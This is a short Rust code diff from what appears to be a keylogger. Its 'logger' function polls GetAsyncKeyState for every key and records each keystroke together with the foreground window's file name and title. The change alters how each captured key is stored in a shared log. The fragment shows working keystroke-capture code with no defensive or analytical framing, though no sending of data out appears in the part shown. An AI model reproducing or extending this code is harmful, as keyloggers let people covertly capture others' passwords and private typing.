@@ -62,12 +62,12 @@ pub fn logger(logg: Arc<Mutex<Vec<KeyLoggData>>>) {
         let key = unsafe { GetAsyncKeyState(i) };
 
         if (key & 1) > 0 {
-            let x= format!("time:{} filename:{} title:{} key:{}", get_current_timestamp(), filename, title, keycode_to_string(i as u8));
+            // let x= format!("time:{} filename:{} title:{} key:{}", get_current_timestamp(), filename, title, keycode_to_string(i as u8));
             let mut log = logg.lock().unwrap();
             log.push(KeyLoggData {
                 file_name: filename.clone(),
                 title: title.clone(),
-                data: x,
+                data: keycode_to_string(i as u8),
                 timestamp: get_current_timestamp(),
             });
             
